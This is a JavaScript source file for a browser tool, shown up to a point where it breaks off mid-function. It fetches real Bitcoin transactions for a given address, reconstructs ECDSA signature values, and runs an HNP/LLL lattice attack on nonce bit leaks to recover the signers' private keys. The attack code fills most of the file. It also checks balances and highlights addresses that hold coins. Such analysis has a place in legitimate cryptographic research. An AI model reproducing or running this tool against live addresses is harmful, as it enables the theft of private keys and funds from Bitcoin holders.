/*
 * TXID / Address -> R, S, Z, Address + ECDSA Nonce BIT-LEAK key recovery.
 * Engine extracted from the CryptographyTube Tools collection.
 * Self-contained: depends only on CryptoJS (crypto-js) which is loaded
 * before this file. Exposes window.processTxid() and window.exportOne().
 *
 * How it works: given a Bitcoin address (or a TXID), it fetches the raw
 * transaction(s), reconstructs the ECDSA signature components (R, S, Z) for
 * every input, groups them by the signing public key, and then attacks each
 * signer with the Hidden Number Problem: assuming a fixed number of leaked
 * nonce bits (top bits = MSB, or low bits = LSB), it builds an HNP lattice
 * and runs LLL reduction to recover the private key. A result is reported
 * ONLY when the recovered key regenerates the on-chain public key — so there
 * are no false positives. This needs several signatures from the SAME key and
 * does NOT rely on R-value reuse (nonce reuse is just the trivial full-leak
 * case). The heavy lattice math runs in a Web Worker so the page never freezes.
 */
(function () {
    "use strict";

    // ---- Constants -------------------------------------------------------
    const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    const N = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');

    const BLOCKCHAIN_API_KEYS = [
        "51c6e11c-1c5c-4c6e-8e8e-8e8e8e8e8e8e",
        "a1b2c3d4-e5f6-4a5b-8c7d-9e0f1a2b3c4d",
        "9e8d7c6b-5a4f-3e2d-1c0b-9a8f7e6d5c4b",
        "f1e2d3c4-b5a6-9d8c-7b6a-5f4e3d2c1b0a",
        "0a1b2c3d-4e5f-6a7b-8c9d-0e1f2a3b4c5d"
    ];

    // ---- Low-level converters -------------------------------------------
    function hexToBytes(hex) {
        if (!hex || typeof hex !== 'string') return new Uint8Array();
        if (hex.length % 2 !== 0) hex = '0' + hex;
        const matches = hex.match(/.{1,2}/g);
        if (!matches) return new Uint8Array();
        return new Uint8Array(matches.map(byte => parseInt(byte, 16)));
    }
    function bytesToHex(bytes) {
        return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
    }
    function hexToBigInt(hex) { return BigInt('0x' + hex); }

    function reverseHex(hex) {
        if (hex.length % 2 !== 0) throw new Error("Hex string length is odd.");
        return hex.match(/.{1,2}/g).reverse().join('');
    }

    function readVarInt(buf, offset) {
        let prefix = buf[offset];
        if (prefix < 0xFD) return { val: prefix, size: 1 };
        if (prefix === 0xFD) {
            let val = buf[offset + 1] | (buf[offset + 2] << 8);
            return { val: val, size: 3 };
        }
        if (prefix === 0xFE) {
            let val = buf[offset + 1] | (buf[offset + 2] << 8) | (buf[offset + 3] << 16) | (buf[offset + 4] << 24);
            return { val: val, size: 5 };
        }
        return { val: buf[offset + 1], size: 9 };
    }

    // ---- Math ------------------------------------------------------------
    function modInverse(a, m) {
        if (a === 0n) throw new Error("Division by zero (no modular inverse)");
        let m0 = m;
        let x0 = 0n;
        let x1 = 1n;
        a %= m;

        while (a > 1n) {
            if (m === 0n) throw new Error("Modular inverse does not exist");
            let q = a / m;
            let t = m;

            m = a % m;
            a = t;

            t = x0;
            x0 = x1 - q * x0;
            x1 = t;
        }

        if (a === 0n) throw new Error("Modular inverse does not exist");

        if (x1 < 0n) {
            x1 += m0;
        }
        return x1;
    }

    // ---- Hashing (CryptoJS) ---------------------------------------------
    function sha256hex(hex) { return CryptoJS.SHA256(CryptoJS.enc.Hex.parse(hex)).toString(); }
    function ripe160hex(hex) { return CryptoJS.RIPEMD160(CryptoJS.enc.Hex.parse(hex)).toString(); }
    function dblsha256(hex) { return sha256hex(sha256hex(hex)); }

    // ---- Base58 / address ------------------------------------------------
    function b58encode(hex) {
        let num = BigInt("0x" + hex);
        let str = "";
        while (num > 0) {
            str = ALPHABET[Number(num % 58n)] + str;
            num /= 58n;
        }
        for (let i = 0; i < hex.length; i += 2) {
            if (hex.substring(i, i + 2) === "00") str = "1" + str;
            else break;
        }
        return str;
    }

    function hash160ToAddress(hash160, version_byte) {
        const versioned_hash_hex = version_byte + hash160;
        const versioned_hash_bytes = CryptoJS.enc.Hex.parse(versioned_hash_hex);
        const checksum = CryptoJS.SHA256(CryptoJS.SHA256(versioned_hash_bytes)).toString().substring(0, 8);
        return b58encode(versioned_hash_hex + checksum);
    }

    function pubToAddr_P2PKH(pub_hex) {
        const pub_bin = hexToBytes(pub_hex);
        const sha256_hash = sha256hex(bytesToHex(pub_bin));
        const ripemd160_hash = ripe160hex(sha256_hash);
        return hash160ToAddress(ripemd160_hash, "00");
    }

    // ---- DER signature parsing ------------------------------------------
    function tryParseDerAt(buf, pos) {
        if (!buf || pos + 7 > buf.length) return null;
        try {
            if (buf[pos] !== 0x30) return null; // SEQUENCE (0x30)

            const total_len = buf[pos + 1];
            if (total_len < 6) return null;
            const end = pos + 2 + total_len;
            if (end > buf.length) return null;

            if (buf[pos + 2] !== 0x02) return null; // INTEGER (R-value)

            const r_len = buf[pos + 3];
            const r_start = pos + 4;
            const r_end = r_start + r_len;
            if (r_end >= buf.length || r_end >= end) return null;

            if (buf[r_end] !== 0x02) return null; // INTEGER (S-value)

            const s_len = buf[r_end + 1];
            const s_start = r_end + 2;
            const s_end = s_start + s_len;
            if (s_end > buf.length || s_end > end) return null;

            const r_bytes = buf.slice(r_start, r_end);
            const s_bytes = buf.slice(s_start, s_end);

            let r_hex = bytesToHex(r_bytes);
            let s_hex = bytesToHex(s_bytes);
            if (r_hex.startsWith('00') && r_hex.length > 2) r_hex = r_hex.substring(2);
            if (s_hex.startsWith('00') && s_hex.length > 2) s_hex = s_hex.substring(2);

            const consumed = end - pos;
            return { r: r_hex, s: s_hex, len: consumed };
        } catch (e) {
            return null;
        }
    }

    function parseDER(hex) {
        try {
            if (hex.endsWith("01") || hex.endsWith("81") || hex.endsWith("02") || hex.endsWith("82") || hex.endsWith("03") || hex.endsWith("83")) {
                hex = hex.substring(0, hex.length - 2); // Remove HashType
            }
            let cursor = 0;
            if (hex.substring(cursor, cursor + 2) !== "30") return {}; cursor += 2;
            cursor += 2; // skip total length

            if (hex.substring(cursor, cursor + 2) !== "02") return {}; cursor += 2;
            const rLen = parseInt(hex.substring(cursor, cursor + 2), 16) * 2; cursor += 2;
            let r = hex.substring(cursor, cursor + rLen); cursor += rLen;
            if (r.startsWith("00")) r = r.substring(2);

            if (hex.substring(cursor, cursor + 2) !== "02") return {}; cursor += 2;
            const sLen = parseInt(hex.substring(cursor, cursor + 2), 16) * 2; cursor += 2;
            let s = hex.substring(cursor, cursor + sLen);
            if (s.startsWith("00")) s = s.substring(2);

            return { r, s };
        } catch (e) { return {}; }
    }

    function parseScriptSig(scr) {
        const buf = hexToBytes(scr);
        let r = "", s = "", pub = "";

        // Scan for DER signature (P2PKH standard)
        for (let i = 0; i < buf.length - 10; i++) {
            const maybe = tryParseDerAt(buf, i);
            if (maybe) {
                r = maybe.r;
                s = maybe.s;
                let nextPos = i + maybe.len + 1;
                if (nextPos < buf.length) {
                    let pubPushLen = buf[nextPos];
                    if ((pubPushLen === 33 || pubPushLen === 65) && nextPos + 1 + pubPushLen <= buf.length) {
                        pub = bytesToHex(buf.slice(nextPos + 1, nextPos + 1 + pubPushLen));
                        if (!pub.startsWith("02") && !pub.startsWith("03") && !pub.startsWith("04")) pub = "";
                    }
                }
                if (r && s) break;
            }
        }

        // Fallback search for pubkey if not directly after signature
        if (!pub) {
            for (let i = 0; i < buf.length - 33; i++) {
                let len = buf[i];
                if (len === 33 || len === 65) {
                    let potential = bytesToHex(buf.slice(i + 1, i + 1 + len));
                    if (potential.startsWith("02") || potential.startsWith("03") || potential.startsWith("04")) {
                        pub = potential;
                        break;
                    }
                }
            }
        }

        return { r, s, pub };
    }

    // ---- Transaction parsing --------------------------------------------
    function parseHexTransaction(txRaw) {
        const buf = hexToBytes(txRaw);
        let cursor = 0;

        const version = bytesToHex(buf.slice(cursor, cursor + 4)); cursor += 4;

        let isSegwit = false;
        if (buf[cursor] === 0x00 && buf[cursor + 1] === 0x01) {
            isSegwit = true;
            cursor += 2;
        }

        const inCountData = readVarInt(buf, cursor); cursor += inCountData.size;
        const inputs = [];
        for (let i = 0; i < inCountData.val; i++) {
            const pre_raw = bytesToHex(buf.slice(cursor, cursor + 32));
            const vout_raw = bytesToHex(buf.slice(cursor + 32, cursor + 36));
            cursor += 36;
            const scriptLen = readVarInt(buf, cursor); cursor += scriptLen.size;
            const script_hex = bytesToHex(buf.slice(cursor, cursor + scriptLen.val)); cursor += scriptLen.val;
            const seq_raw = bytesToHex(buf.slice(cursor, cursor + 4)); cursor += 4;
            inputs.push({ pre_raw, vout_raw, script_hex, seq_raw });
        }

        const outCountData = readVarInt(buf, cursor); cursor += outCountData.size;
        const outputs = [];
        for (let i = 0; i < outCountData.val; i++) {
            const value_raw = bytesToHex(buf.slice(cursor, cursor + 8)); cursor += 8;
            const outScriptLen = readVarInt(buf, cursor); cursor += outScriptLen.size;
            const script_hex = bytesToHex(buf.slice(cursor, cursor + outScriptLen.val)); cursor += outScriptLen.val;
            outputs.push({ value_raw, script_len_raw: (outScriptLen.size === 1 ? outScriptLen.val.toString(16).padStart(2, '0') : "fd" + reverseHex(outScriptLen.val.toString(16).padStart(4, '0'))), script_hex });
        }

        if (isSegwit) {
            for (let i = 0; i < inCountData.val; i++) {
                const witnessCount = readVarInt(buf, cursor); cursor += witnessCount.size;
                const witnesses = [];
                for (let j = 0; j < witnessCount.val; j++) {
                    const itemLen = readVarInt(buf, cursor); cursor += itemLen.size;
                    witnesses.push(bytesToHex(buf.slice(cursor, cursor + itemLen.val)));
                    cursor += itemLen.val;
                }
                inputs[i].witness = witnesses;
            }
        }

        const locktime_raw = bytesToHex(buf.slice(cursor, cursor + 4));
        return { version, inputs, outputs, locktime_raw, isSegwit };
    }

    function parsingRaw(rawtx) {
        return parseHexTransaction(rawtx);
    }

    function getrsz_v2(fullTx, inputIndex, scriptPubKey) {
        // Legacy SIGHASH_ALL reconstruction
        let e = fullTx.version;
        let inCount = fullTx.inputs.length;
        let inCountHex = (inCount < 253) ? inCount.toString(16).padStart(2, '0') :
            (inCount < 65536) ? "fd" + reverseHex(inCount.toString(16).padStart(4, '0')) :
                "fe" + reverseHex(inCount.toString(16).padStart(8, '0'));

        e += inCountHex;

        for (let i = 0; i < inCount; i++) {
            const inp = fullTx.inputs[i];
            e += inp.pre_raw;
            e += inp.vout_raw;

            if (i === inputIndex) {
                const spk = scriptPubKey || "";
                const spkLen = (spk.length / 2);
                const spkLenHex = (spkLen < 253) ? spkLen.toString(16).padStart(2, '0') :
                    (spkLen < 65536) ? "fd" + reverseHex(spkLen.toString(16).padStart(4, '0')) :
                        "fe" + reverseHex(spkLen.toString(16).padStart(8, '0'));
                e += spkLenHex + spk;
            } else {
                e += "00";
            }
            e += inp.seq_raw;
        }

        // Outputs
        let outCount = fullTx.outputs.length;
        let outCountHex = (outCount < 253) ? outCount.toString(16).padStart(2, '0') : "fd" + reverseHex(outCount.toString(16).padStart(4, '0'));
        e += outCountHex;
        for (let out of fullTx.outputs) {
            e += out.value_raw + out.script_len_raw + out.script_hex;
        }

        e += fullTx.locktime_raw + "01000000"; // SIGHASH_ALL
        return dblsha256(e);
    }

    function getrsz(parsed) {
        const results = [];
        for (let i = 0; i < parsed.inputs.length; i++) {
            const inp = parsed.inputs[i];
            let r, s, pub;

            // 1. Check Legacy scriptSig
            if (inp.script_hex) {
                const sigData = parseScriptSig(inp.script_hex);
                if (sigData.r) {
                    r = sigData.r; s = sigData.s; pub = sigData.pub;
                }
            }

            // 2. Check Segwit Witness (If no legacy sig found)
            if (!r && inp.witness && inp.witness.length >= 2) {
                // In P2WPKH, Witness is [Signature, PubKey]
                const witnessSig = inp.witness[0];
                const witnessPub = inp.witness[1];
                if (witnessSig && witnessPub) {
                    const der = parseDER(witnessSig);
                    if (der.r) {
                        r = der.r; s = der.s; pub = witnessPub;
                    }
                }
            }

            if (!r || !s || !pub) continue;

            const pubHash160 = ripe160hex(sha256hex(pub));
            const scriptPubKey = "76a914" + pubHash160 + "88ac";
            const addr = pubToAddr_P2PKH(pub);

            const z = getrsz_v2(parsed, i, scriptPubKey);

            results.push({
                input_index: i,
                addr: addr,
                r: r,
                s: s,
                z: z,
                pub: pub
            });
        }
        return results;
    }

    // ---- Network ---------------------------------------------------------
    async function getRawTx(txid) {
        if (!txid || txid.length !== 64) throw new Error("Invalid TXID");

        const urls = [
            `https://blockstream.info/api/tx/${txid}/hex`,
            `https://blockchain.info/rawtx/${txid}?format=hex`
        ];

        for (let url of urls) {
            try {
                const response = await fetch(url, { signal: AbortSignal.timeout(6000) });
                if (response.ok) {
                    const rawtx = await response.text();
                    if (rawtx && rawtx.length > 50 && !rawtx.includes("not found") && !rawtx.startsWith("<!DOCTYPE")) {
                        return rawtx.trim();
                    }
                }
            } catch (e) {
                console.warn(`Fallback: Failed to fetch from ${url}. Trying next...`);
            }
            await new Promise(r => setTimeout(r, 300));
        }

        throw new Error(`API Exhaustion: Could not fetch raw TX ${txid.substring(0, 8)}. Please wait a moment and retry.`);
    }

    // List an address's transaction ids, newest first, up to `want`.
    // Primary: blockstream.info Esplora (CORS-friendly, no API key, 25/page, paged
    // by last-seen txid). Fallback: blockchain.info rawaddr (offset paging).
    // Returns an array of txids, [] if the address genuinely has none, or null if
    // every explorer failed (network / CORS / rate-limit) so the caller can warn.
    async function fetchAddressTxids(addr, want, onProgress) {
        let anyOk = false;

        // --- blockstream.info Esplora (primary) ---
        try {
            let txids = [];
            let lastSeen = '';
            let guard = 0;
            while (txids.length < want && guard < 5000) {
                guard++;
                const url = lastSeen
                    ? `https://blockstream.info/api/address/${addr}/txs/chain/${lastSeen}`
                    : `https://blockstream.info/api/address/${addr}/txs/chain`;
                const resp = await fetch(url, { signal: AbortSignal.timeout(15000) });
                if (!resp.ok) break;
                anyOk = true;
                const arr = await resp.json();
                if (!Array.isArray(arr) || arr.length === 0) break;
                for (const t of arr) txids.push(t.txid);
                lastSeen = arr[arr.length - 1].txid;
                if (onProgress) onProgress({ phase: 'list', listed: txids.length, target: want });
                if (arr.length < 25) break;               // final (short) page
                await new Promise(r => setTimeout(r, 120));
            }
            if (txids.length > 0) return txids.slice(0, want);
            if (anyOk) return [];                          // responded OK but no txs
        } catch (e) { /* fall through to blockchain.info */ }

        // --- blockchain.info rawaddr (fallback) ---
        try {
            let txids = [];
            let total = null;
            let offset = 0;
            const PAGE = 50;                               // rawaddr max per request
            while (txids.length < want) {
                const pageLimit = Math.min(PAGE, want - txids.length);
                const url = `https://blockchain.info/rawaddr/${addr}?limit=${pageLimit}&offset=${offset}&cors=true`;
                const resp = await fetch(url, { signal: AbortSignal.timeout(15000) });
                if (!resp.ok) break;
                anyOk = true;
                const data = await resp.json();
                if (!data || !Array.isArray(data.txs)) break;
                if (total === null) total = data.n_tx || 0;
                if (data.txs.length === 0) break;
                for (const tx of data.txs) txids.push(tx.hash);
                offset += data.txs.length;
                if (onProgress) onProgress({ phase: 'list', listed: txids.length, target: Math.min(want, total || want) });
                if (total && offset >= total) break;
                if (data.txs.length < pageLimit) break;
                await new Promise(r => setTimeout(r, 150));
            }
            if (txids.length > 0) return txids.slice(0, want);
            if (anyOk) return [];
        } catch (e) { /* both sources failed */ }

        return anyOk ? [] : null;
    }

    async function fetchBlockchainData(addr, want, onProgress) {
        want = Math.max(1, parseInt(want, 10) || 100);
        const results = [];

        // 1) Collect exactly `want` tx ids for the address (capped at what exists).
        const txHashes = await fetchAddressTxids(addr, want, onProgress);
        if (txHashes === null) {
            throw new Error("Couldn't reach a block explorer for this address (it may be rate-limiting). Please wait a few seconds and try again, or lower the count.");
        }
        if (txHashes.length === 0) return results;         // address has no transactions

        // 2) For each tx: fetch raw hex, reconstruct R,S,Z, keep the inputs this
        //    address signed. Small concurrent batches + throttle to dodge rate limits.
        const target = txHashes.length;
        let scanned = 0;
        const BATCH = 4;
        for (let b = 0; b < txHashes.length; b += BATCH) {
            const slice = txHashes.slice(b, b + BATCH);
            const settled = await Promise.all(slice.map(async (h) => {
                try {
                    const raw = await getRawTx(h);
                    const parsed = parsingRaw(raw);
                    const matched = getrsz(parsed).filter(it => it.addr === addr);
                    matched.forEach(it => { it.txid = h; });
                    return matched;
                } catch (e) { return []; }
            }));
            settled.forEach(arr => { for (const it of arr) results.push(it); });
            scanned += slice.length;
            if (onProgress) onProgress({ phase: 'scan', scanned: scanned, target: target, found: results.length });
            await new Promise(r => setTimeout(r, 120));
        }
        return results;
    }

    // ---- Address balance / activity stats (same box as Address Analysis) --
    function formatBtc(sats) {
        const n = Number(sats || 0) / 1e8;                 // < 2^53, safe for BTC supply
        const s = n.toFixed(8).replace(/\.?0+$/, '');
        return (s || '0') + ' BTC';
    }

    // Balance / Received / TX for an address. blockstream primary, blockchain.info
    // fallback. Returns {balance, received, tx} (satoshis) or null on total failure.
    async function fetchAddressStats(addr) {
        try {
            const resp = await fetch(`https://blockstream.info/api/address/${addr}`, { signal: AbortSignal.timeout(15000) });
            if (resp.ok) {
                const d = await resp.json();
                const c = d.chain_stats || {};
                const m = d.mempool_stats || {};
                const funded = (c.funded_txo_sum || 0) + (m.funded_txo_sum || 0);
                const spent = (c.spent_txo_sum || 0) + (m.spent_txo_sum || 0);
                const txc = (c.tx_count || 0) + (m.tx_count || 0);
                return { balance: funded - spent, received: funded, tx: txc };
            }
        } catch (e) { /* fall through */ }
        try {
            const resp = await fetch(`https://blockchain.info/rawaddr/${addr}?limit=0&cors=true`, { signal: AbortSignal.timeout(15000) });
            if (resp.ok) {
                const d = await resp.json();
                return { balance: d.final_balance || 0, received: d.total_received || 0, tx: d.n_tx || 0 };
            }
        } catch (e) { /* give up */ }
        return null;
    }

    // Rotating balance-check spinner — the same wheel the Public Key Toolkit /
    // private-keys pages show while an explorer request is in flight. Own class
    // (.txr-spin, not .fa-icon) so the global icon-tint filters never recolour it;
    // it is tinted + spun by tool.css.
    function spinner(size) {
        const n = size || 13;
        return '<img src="../assets/svgs/solid/spinner.svg" class="txr-spin" width="' + n +
            '" height="' + n + '" alt="loading">';
    }
    function setStats(stats) {
        const b = document.getElementById('txr-stat-balance');
        const r = document.getElementById('txr-stat-received');
        const t = document.getElementById('txr-stat-tx');
        // Turn the amount green when the address holds (Balance) or has ever held
        // (Received) coins — matching the private-keys balance colour (#22c55e).
        if (b) { b.textContent = stats ? formatBtc(stats.balance) : '0 BTC'; b.classList.toggle('has-balance', !!(stats && stats.balance > 0)); }
        if (r) { r.textContent = stats ? formatBtc(stats.received) : '0 BTC'; r.classList.toggle('has-balance', !!(stats && stats.received > 0)); }
        if (t) t.textContent = stats ? String(stats.tx) : '0';
    }
    // Show the spinner in the Balance / Received / TX boxes while their lookup runs.
    function statLoading() {
        ['txr-stat-balance', 'txr-stat-received', 'txr-stat-tx'].forEach(function (id) {
            const el = document.getElementById(id);
            if (el) { el.innerHTML = spinner(16); el.classList.remove('has-balance'); }
        });
    }

    async function resolveInputToRSZ(input, want, onProgress) {
        if (!input) return [];
        let inText = input.trim();
        // Detect if Address (roughly 26-62 chars, no colons)
        if (inText.length >= 26 && inText.length <= 62 && !inText.includes(':')) {
            return await fetchBlockchainData(inText, want, onProgress);
        }
        // Assume RSZ Bulk format
        return inText.split('\n').map(l => {
            let p = l.split(':');
            if (p.length >= 3) return { r: p[0].trim(), s: p[1].trim(), z: p[2].trim() };
            return null;
        }).filter(it => it && it.r.length > 50);
    }

    // ---- Nonce bit-leak recovery (HNP + LLL, runs in a Web Worker) -------
    // The entire crypto core lives inside this function; it is never called on
    // the main thread — we stringify it and spin it up as a Worker so the
    // (multi-second) lattice reduction never blocks the page. Pure BigInt, no
    // DOM / CryptoJS / fetch. Message in: {groups:[{addr,pub,sigs:[{r,s,z}]}]}
    // (r,s,z as hex). Messages out: {type:'progress',…} then {type:'done',results}.
    function leakWorkerBody() {
        "use strict";
        var P = (2n ** 256n) - (2n ** 32n) - 977n;
        var N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141n;
        var Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798n;
        var Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8n;

        function mod(a, m) { var r = a % m; return r < 0n ? r + m : r; }
        function egcd(a, b) { if (b === 0n) return [a, 1n, 0n]; var r = egcd(b, a % b); return [r[0], r[2], r[1] - (a / b) * r[2]]; }
        function modInv(a, m) { a = mod(a, m); var r = egcd(a, m); if (r[0] !== 1n) throw new Error("no inverse"); return mod(r[1], m); }
        function ptAdd(Pp, Qp) {
            if (!Pp) return Qp; if (!Qp) return Pp;
            if (Pp.x === Qp.x && mod(Pp.y + Qp.y, P) === 0n) return null;
            var l;
            if (Pp.x === Qp.x && Pp.y === Qp.y) { l = mod((3n * Pp.x * Pp.x) * modInv(2n * Pp.y, P), P); }
            else { l = mod((Qp.y - Pp.y) * modInv(mod(Qp.x - Pp.x, P), P), P); }
            var x = mod(l * l - Pp.x - Qp.x, P);
            var y = mod(l * (Pp.x - x) - Pp.y, P);
            return { x: x, y: y };
        }
        function sMul(k) {
            k = mod(k, N); var R = null; var A = { x: Gx, y: Gy };
            while (k > 0n) { if (k & 1n) R = ptAdd(R, A); A = ptAdd(A, A); k >>= 1n; }
            return R;
        }
        function hx(b) { var s = b.toString(16); while (s.length < 64) s = "0" + s; return s; }
        function compressPoint(Q) { return (Q.y & 1n ? "03" : "02") + hx(Q.x); }
        function compressPub(pub) {
            pub = pub.toLowerCase();
            if (pub.length === 66 && (pub.slice(0, 2) === "02" || pub.slice(0, 2) === "03")) return pub;
            if (pub.length === 130 && pub.slice(0, 2) === "04") {
                var x = pub.slice(2, 66); var y = BigInt("0x" + pub.slice(66));
                return (y & 1n ? "03" : "02") + x;
            }
            return null;
        }

        // Fraction-free integer LLL (de Weger / Cohen 2.6.3, delta=3/4). All
        // Gram quantities stay integer, so no fraction blow-up. b is 1-indexed.
        function nearestQ(a, b) { var num = 2n * a + b, den = 2n * b; var q = num / den; if (num % den !== 0n && ((num < 0n) !== (den < 0n))) q -= 1n; return q; }
        function lll(B) {
            var n = B.length; if (n < 2) return B;
            var dim = B[0].length;
            var b = [null]; for (var ii = 0; ii < n; ii++) b.push(B[ii]);
            var d = new Array(n + 1); for (var z = 0; z <= n; z++) d[z] = 0n; d[0] = 1n;
            var lam = []; for (var z2 = 0; z2 <= n; z2++) { var lrow = []; for (var z3 = 0; z3 <= n; z3++) lrow.push(0n); lam.push(lrow); }
            function dot(u, v) { var s = 0n; for (var t = 0; t < dim; t++) s += u[t] * v[t]; return s; }
            d[1] = dot(b[1], b[1]);
            function REDI(k, l) {
                var a = lam[k][l] < 0n ? -lam[k][l] : lam[k][l];
                if (2n * a <= d[l]) return;
                var q = nearestQ(lam[k][l], d[l]);
                for (var t = 0; t < dim; t++) b[k][t] -= q * b[l][t];
                lam[k][l] -= q * d[l];
                for (var i = 1; i <= l - 1; i++) lam[k][i] -= q * lam[l][i];
            }
            function SWAPI(k) {
                var tb = b[k]; b[k] = b[k - 1]; b[k - 1] = tb;
                for (var j = 1; j <= k - 2; j++) { var t0 = lam[k][j]; lam[k][j] = lam[k - 1][j]; lam[k - 1][j] = t0; }
                var lamv = lam[k][k - 1];
                var Bv = (d[k - 2] * d[k] + lamv * lamv) / d[k - 1];
                for (var i = k + 1; i <= n; i++) {
                    var t = lam[i][k];
                    lam[i][k] = (d[k] * lam[i][k - 1] - lamv * t) / d[k - 1];
                    lam[i][k - 1] = (Bv * t + lamv * lam[i][k]) / d[k];
                }
                d[k - 1] = Bv;
            }
            var k = 2, kmax = 1;
            while (k <= n) {
                if (k > kmax) {
                    kmax = k;
                    for (var j = 1; j <= k; j++) {
                        var u = dot(b[k], b[j]);
                        for (var i = 1; i <= j - 1; i++) u = (d[i] * u - lam[k][i] * lam[j][i]) / d[i - 1];
                        if (j < k) lam[k][j] = u; else d[k] = u;
                    }
                }
                REDI(k, k - 1);
                var lamv2 = lam[k][k - 1];
                if (4n * d[k] * d[k - 2] < 3n * d[k - 1] * d[k - 1] - 4n * lamv2 * lamv2) { SWAPI(k); k = k > 2 ? k - 1 : 2; }
                else { for (var l = k - 2; l >= 1; l--) REDI(k, l); k++; }
            }
            for (var i2 = 0; i2 < n; i2++) B[i2] = b[i2 + 1];
            return B;
        }

        // Solve the Hidden Number Problem for m signatures assuming an L-bit
        // nonce leak (model 'msb' = top bits zero, 'lsb' = low bits zero).
        // Returns the private key d (BigInt) iff d*G matches cpub, else null.
        function solveHNP(sigs, model, L, cpub) {
            var m = sigs.length;
            var B = 1n << (256n - BigInt(L));
            var inv2 = model === "lsb" ? modInv(1n << BigInt(L), N) : 1n;
            var t = [], a = [];
            for (var q = 0; q < m; q++) {
                var si = modInv(sigs[q].s, N);
                var ti = mod(sigs[q].r * si, N);
                var ai = mod(sigs[q].z * si, N);
                if (model === "lsb") { ti = mod(ti * inv2, N); ai = mod(ai * inv2, N); }
                t.push(ti); a.push(ai);
            }
            var dim = m + 2;
            var M = [];
            for (var i = 0; i < m; i++) { var row = new Array(dim); for (var z = 0; z < dim; z++) row[z] = 0n; row[i] = N * N; M.push(row); }
            var rt = new Array(dim); for (var z2 = 0; z2 < dim; z2++) rt[z2] = 0n; for (var i2 = 0; i2 < m; i2++) rt[i2] = N * t[i2]; rt[m] = B; M.push(rt);
            var ra = new Array(dim); for (var z3 = 0; z3 < dim; z3++) ra[z3] = 0n; for (var i3 = 0; i3 < m; i3++) ra[i3] = N * a[i3]; ra[m + 1] = N * B; M.push(ra);
            lll(M);
            var seen = {};
            function chk(dd) {
                if (dd <= 0n || dd >= N) return false;
                var key = dd.toString();
                if (seen[key]) return false; seen[key] = 1;
                var Q = sMul(dd); if (!Q) return false;
                return compressPoint(Q) === cpub;
            }
            for (var ri = 0; ri < M.length; ri++) {
                var rv = M[ri];
                var signs = [1n, -1n];
                for (var s2 = 0; s2 < 2; s2++) {
                    var sg = signs[s2];
                    if (rv[m] !== 0n && mod(sg * rv[m], B) === 0n) { var dc = mod((sg * rv[m]) / B, N); if (chk(dc)) return dc; }
                    for (var ii = 0; ii < m; ii++) {
                        if (rv[ii] !== 0n && mod(sg * rv[ii], N) === 0n) {
                            var ki = (sg * rv[ii]) / N;
                            if (ki >= 0n && ki < B) {
                                try { var dc2 = mod((ki - a[ii]) * modInv(t[ii], N), N); if (chk(dc2)) return dc2; } catch (e) { }
                            }
                        }
                    }
                }
            }
            return null;
        }

        // Ladder of leak sizes to test, largest L (fewest bits, cheapest) first.
        // Only as many signatures as a given L needs are used, so the common
        // small-signer case stays fast; big signers cap at MAXSIGS (dim 22).
        var LADDER = [64, 48, 32, 24, 20, 16];
        var GUARD = 4, MAXSIGS = 20;
        function analyzeGroup(g, report) {
            var raw = g.sigs.map(function (s) { return { r: BigInt("0x" + s.r), s: BigInt("0x" + s.s), z: BigInt("0x" + s.z) }; });
            var seen = {}, sigs = [];
            for (var i = 0; i < raw.length; i++) {
                var kk = raw[i].r.toString() + "_" + raw[i].s.toString() + "_" + raw[i].z.toString();
                if (!seen[kk]) { seen[kk] = 1; sigs.push(raw[i]); }
            }
            var cpub = compressPub(g.pub);
            var avail = sigs.length;
            var out = { addr: g.addr, pub: g.pub, count: avail, found: false };
            if (!cpub || avail < 4) return out;
            var models = ["msb", "lsb"];
            for (var mi = 0; mi < models.length; mi++) {
                for (var li = 0; li < LADDER.length; li++) {
                    var L = LADDER[li];
                    var need = Math.ceil(256 / L);
                    if (avail < need) continue;
                    var m = Math.min(avail, need + GUARD, MAXSIGS);
                    if (m < need) continue;
                    report({ type: "progress", phase: "attempt", model: models[mi], L: L, m: m });
                    var d = solveHNP(sigs.slice(0, m), models[mi], L, cpub);
                    if (d) {
                        var pk = d.toString(16); while (pk.length < 64) pk = "0" + pk;
                        out.found = true; out.L = L; out.model = models[mi]; out.priv = pk; out.usedSigs = m;
                        return out;
                    }
                }
            }
            return out;
        }
        onmessage = function (e) {
            var groups = e.data.groups; var results = [];
            for (var gi = 0; gi < groups.length; gi++) {
                (function (gi) {
                    var g = groups[gi];
                    postMessage({ type: "progress", phase: "signer", gi: gi, total: groups.length, addr: g.addr, count: g.sigs.length });
                    results.push(analyzeGroup(g, function (p) { p.gi = gi; p.total = groups.length; p.addr = g.addr; postMessage(p); }));
                })(gi);
            }
            postMessage({ type: "done", results: results });
        };
    }

    var WORKER_SRC = '(' + leakWorkerBody.toString() + ')()';
    var _leakWorkerURL = null;
    function buildWorker() {
        try {
            if (typeof Worker === 'undefined' || typeof URL === 'undefined' || !URL.createObjectURL) return null;
            if (!_leakWorkerURL) _leakWorkerURL = URL.createObjectURL(new Blob([WORKER_SRC], { type: 'application/javascript' }));
            return new Worker(_leakWorkerURL);
        } catch (e) { return null; }
    }

    // Group extracted signatures by signing public key (one HNP instance each).
    function groupByPub(rsz) {
        var map = {};
        for (var i = 0; i < rsz.length; i++) {
            var e = rsz[i];
            if (!e.pub || !e.r || !e.s || !e.z) continue;
            if (!map[e.pub]) map[e.pub] = { pub: e.pub, addr: e.addr, sigs: [] };
            map[e.pub].sigs.push({ r: e.r, s: e.s, z: e.z });
        }
        return Object.keys(map).map(function (k) { return map[k]; });
    }

    // Run the bit-leak analysis in the worker. Resolves {groups, results}:
    //   results = array of per-signer verdicts (only signers with >=4 sigs),
    //   results = []   -> nobody had enough signatures to test,
    //   results = null -> Web Worker unavailable / errored.
    function runLeakAnalysis(rsz, onProgress) {
        return new Promise(function (resolve) {
            var groups = groupByPub(rsz);
            var candidates = groups.filter(function (g) { return g.sigs.length >= 4; });
            if (!candidates.length) { resolve({ groups: groups, results: [] }); return; }
            var w = buildWorker();
            if (!w) { resolve({ groups: groups, results: null }); return; }
